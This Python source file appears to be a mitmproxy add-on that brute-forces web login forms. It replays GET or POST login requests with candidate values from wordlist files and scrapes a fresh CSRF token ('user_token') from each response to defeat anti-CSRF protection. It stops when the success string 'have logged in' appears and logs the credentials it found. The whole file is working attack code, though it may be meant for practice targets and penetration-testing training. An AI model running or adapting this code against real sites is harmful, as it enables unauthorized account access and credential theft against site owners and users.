""" Utility class

Utility class which contains helper classes:
SuccessDetector: Checks if fuzz was successful.
Attack: Performs an attack.
"""
import logging
from mitmproxy import http
from mitmproxy import net
from mitmproxy import ctx
import os.path
from bs4 import BeautifulSoup

logger = logging.getLogger("formfuzz")

PARAMETER_PREFIX = "fuzz_"
PREFIX_LEN = len(PARAMETER_PREFIX)
DBS_DIR = "./dbs/"

class SuccessDetector:
	"""Detects expected responses for correct credentials"""

	def __init__(self):
		self.last_credentials = None
		self.responses = []
		self.success_string = None

	def insertResponse(self, flow: http.HTTPFlow) -> None:
		"""Inserts all received responses in a list for later processing."""

		if flow.response:
			self.responses.append(flow.response.copy())
		else:
			logger.error("Flow has no response, can't insert")

	def setCredentials(self, credentials: dict) -> None:
		"""Sets credentials."""

		self.last_credentials = credentials
		logger.info("Credentials set:" + str(credentials))

	def setSuccessString(self, success_string: str) -> None:
		"""Sets string indicating correct response."""

		self.success_string = success_string

	def delSuccessString(self):
		"""Sets suc.str. back to Null"""

		self.success_string = None


	def isSuccess(self, flow: http.HTTPFlow) -> dict:
		"""Detects if correct response is triggered."""

		result = None
		if not flow.response:
			logger.error("Flow has no response, can't perform detection")
		
		self.insertResponse(flow)

		if self.success_string in flow.response.text:
			logger.info("SUCCESSFUL RESPONSE!")
			result = self.last_credentials
		return result



class Attack:
	"""Class implementing the attack."""

	def __init__(self):
		self.running = False
		self.fuzzdbs: dict = {}
		self.fuzz_inputs: dict = {}
		self.fuzzed_host = None
		self.fuzzed_url = None
		self.SD = None
		self.originator_flow = None
		self.intercepted_flow = None
		self.attack_type = None # GET or POST

	def isRunning(self):
		"""Checks if the attack is still running."""

		return self.running

	def start(self, flow: http.HTTPFlow):
		"""Starts the attack."""

		self.running = True
		self.mapDBS(flow.request)
		self.loadFuzzInputs()
		self.fuzzed_url = flow.request.url
		self.fuzzed_host = flow.request.host
		self.originator_flow = flow.copy()
		logger.info("Saved originator flow")
		self.get_tmp = None

		if flow.request.method == "GET":
			self.attack_type = "GET"
		elif flow.request.method == "POST":
			self.attack_type = "POST"

		self.SD = SuccessDetector()
		self.SD.setSuccessString("have logged in")
		#self.SD.setSuccessString("Welcome to the password")

		logger.info("Started " + self.attack_type + " attack")

	def stop(self):
		"""Stops the attack."""

		self.running = False
		self.fuzzdbs: dict = {}
		self.fuzz_inputs: dict = {}
		self.fuzzed_host = None
		self.fuzzed_url = None
		self.SD = None
		self.originator_flow = None
		self.intercepted_flow = None
		self.attack_type = None # GET or POST

	def setSuccessString(self, ss: str) -> None:
		"""Sets a success string in SuccessDetector."""

		self.SD.setSuccessString(ss)

	def loadRequestParams(self, request: net.http.request) -> dict:
		#logger.info("In loadRequestParams")
		if request.method == "GET":
			logger.info("Returned GET parameters:" + str(request.query))
			return request.query
		elif request.method == "POST":
			logger.info("Returned POST parameters:" + str(request.urlencoded_form))
			return request.urlencoded_form
		else:
			logger.error("Error loading parameters from the request")
			return None

	def mapDBS(self, request: net.http.request) -> None:
		"""Identifies fuzzed parameters and maps them to respective file paths"""

		parameters = self.loadRequestParams(request)
		for parameter in parameters:
			value = parameters[parameter]
			if value.startswith(PARAMETER_PREFIX):
				self.fuzzdbs[parameter] = DBS_DIR + value[PREFIX_LEN:]
				if not os.path.exists(self.fuzzdbs[parameter]):
					logger.error("Fuzz database " + self.fuzzdbs[parameter] + " does not exist")
				else:
					logger.info("Loaded fuzz db path for parameter " + str(parameter) + " => " + self.fuzzdbs[parameter])

	def loadFuzzInputs(self) -> None:
		"""Loads fuzzing inputs in a list for each parameter"""

		for parameter in self.fuzzdbs:
			inputs = self.loadFuzzParameters(parameter)
			self.fuzz_inputs[parameter] = inputs
			logger.info("Loaded fuzz inputs for parameter: " + parameter)

	def loadFuzzParameters(self, parameter: str) -> list:
		"""Loads fuzz inputs from a file to a list"""

		fuzz_params = []
		param_path = self.fuzzdbs[parameter]
		if not os.path.exists(param_path):
			logger.warning("Path " + param_path + " for parameter " + parameter + " does not exist")
		with open(param_path, "r") as f:
			fuzz_params = [x.strip() for x in f]
		return fuzz_params

	def extractCSRF(self, flow: http.HTTPFlow) -> str:
		"""Extracts CSRF token from HTTP GET response"""

		if not flow.response:
			logger.error("Trying to extract token from an empty response")

		#if flow.request.method == "POST":
		csrf_token = None
		parsed_html = BeautifulSoup(flow.response.content, features="html.parser")
		csrf_token = parsed_html.body.find("input", attrs={"name":"user_token"}).get("value")
		logger.info("Extracted CSRF token:" + csrf_token)
		#elif flow.request.method == "GET":
		#	csrf_token = flow.request.query["user_token"]
		#	logger.info("Found GET CSRF token")
		#else:
		#	logger.warning("No CSRF token detected")
		return csrf_token

	def prepareOriginatorReplay(self, token=None) -> http.HTTPFlow:
		"""Prepares a new POST request from the originator POST form"""

		prepared_request_flow = self.originator_flow.copy()
		if token: 
			if self.attack_type == "POST":
				prepared_request_flow.request.urlencoded_form["user_token"] = token
			elif self.attack_type == "GET":
				prepared_request_flow.request.query["user_token"] = token
		logger.info("Prepared new request flow from originator")
		return prepared_request_flow

	def setParameter(self, flow, parameter):
		"""Sets next parameter depending on POST or GET request"""

		if self.attack_type == "GET":
			flow.request.query[parameter] = self.fuzz_inputs[parameter].pop()
			logger.info("Set new GET parameter:" + flow.request.query[parameter])
		elif self.attack_type == "POST":
			flow.request.urlencoded_form[parameter] = self.fuzz_inputs[parameter].pop()
			logger.info("Set new POST parameter:" + flow.request.urlencoded_form[parameter])
		else:
			logger.error("Attack type not recognized during parameter setup")

	def setNextInput(self, flow: http.HTTPFlow) -> None:
		"""Set next fuzz input from the list."""

		#logger.info("In setNextInput, flow:" + str(flow.request))
		if not flow.request:
			logger.info("Provided flow does not contain a request")
		parameters = self.loadRequestParams(flow.request)
		logger.info("Parameters loaded:" + str(parameters))
		for param in parameters:
			logger.info("Checking parameter for next input:" + param)
			if param in self.fuzz_inputs:
				if not self.fuzz_inputs[param]:
					logger.warning("Fuzz input list is empty, terminating attack")
					self.stop()
					return

				#flow.request.urlencoded_form[param] = self.fuzz_inputs[param].pop()
				self.setParameter(flow, param)
				#self.SD.setCredentials({param:flow.request.urlencoded_form[param]})
				#self.SD.setCredentials(flow.request.urlencoded_form)
				break
		logger.info("Next input set")

	def handleRedirect(self, flow: http.HTTPFlow) -> None:
		"""Handles 302 redirect POST replies."""

		if not flow.is_replay:
			return
		if flow.response.status_code == 302:
			get_flow = self.get_tmp.copy()
			redirect_location = flow.response.headers["Location"]
			get_flow.request.path_components = get_flow.request.path_components[:-1] + (redirect_location, )
			ctx.master.commands.call("replay.client", [get_flow])

	def handleRequest(self, flow: http.HTTPFlow) -> None:
		"""Handles requests received from the client or replayed from mitmproxy."""
		
		if self.attack_type == "POST":
			if flow.request.method == "POST" and flow.request.url == self.fuzzed_url:
				logger.info("Spent CSRF token: " + flow.request.urlencoded_form["user_token"])
				if flow.is_replay == "request":
					self.SD.setCredentials(flow.request.urlencoded_form)
			if flow.is_replay == "request":
				logger.info("Replayed GET request:" + str(flow.request))
				return
			if flow.request.method == "GET" and flow.request.url == self.fuzzed_url:
				self.get_tmp = flow.copy()
				logger.info("Updated tmp GET request flow")

		# GET Attack
		elif self.attack_type == "GET":
			if flow.request.method == "GET":
				if flow.is_replay == "request":
					logger.info("Replaying GET request:" + str(flow.request))
					self.SD.setCredentials(flow.request.query)
		else:
			logger.warning("Attack type not defined")

	def handleResponse(self, flow: http.HTTPFlow) -> None:
		"""Handles responses received from the server or replayed from mitmproxy."""

		if self.attack_type == "POST":
			logger.info("Got response:" + str(flow.response))
			if flow.request.method == "GET" and flow.request.host == self.fuzzed_host:
				logger.info("Received response to GET from fuzzed host")

				credentials = self.SD.isSuccess(flow)
				if credentials:
					self.stop()
					logger.info("Found credentials, attack stopped")
					logger.info("Credentials: " + str(credentials))
					return
				logger.info("Wrong GET response intercepted")

				fresh_token = self.extractCSRF(flow)
				prepared_request_flow = self.prepareOriginatorReplay(fresh_token)

				self.setNextInput(prepared_request_flow)
				if not self.running:
					logger.info("Attack not running therefore exiting")
					return
				self.originator_flow = prepared_request_flow.copy()

				logger.info("Replaying POST request form with parameters: " + str(prepared_request_flow.request.urlencoded_form))
				ctx.master.commands.call("replay.client", [prepared_request_flow])
				

			if flow.request.method == "POST" and flow.request.url == self.fuzzed_url:
				if flow.response.status_code == 302:
					if not flow.is_replay == "request":
						self.handleRedirect(flow)
						logger.info("302 is not a response from replayed mitm request")
					elif flow.is_replay == "request":
						self.handleRedirect(flow)
						logger.info("Handled 302 replayed redirect")

		# GET ATTACK
		elif self.attack_type == "GET":
			if flow.request.method == "GET" and flow.request.host == self.fuzzed_host:
				logger.info("Received response to GET request from fuzzed host")

				credentials = self.SD.isSuccess(flow)
				if credentials:
					self.stop()
					logger.info("Found credentials, attack stopped")
					logger.info("Credentials: " + str(credentials))
					return
				logger.info("Wrong GET response intercepted")

				fresh_token = self.extractCSRF(flow)
				prepared_request_flow = self.prepareOriginatorReplay(fresh_token)

				self.setNextInput(prepared_request_flow)
				if not self.running:
					logger.info("Attack not running therefore exiting")
					return
				logger.info("Replay GET request with parameters" + str(prepared_request_flow.request.query))
				ctx.master.commands.call("replay.client", [prepared_request_flow])


		else:
			logger.warning("Attack type not defined")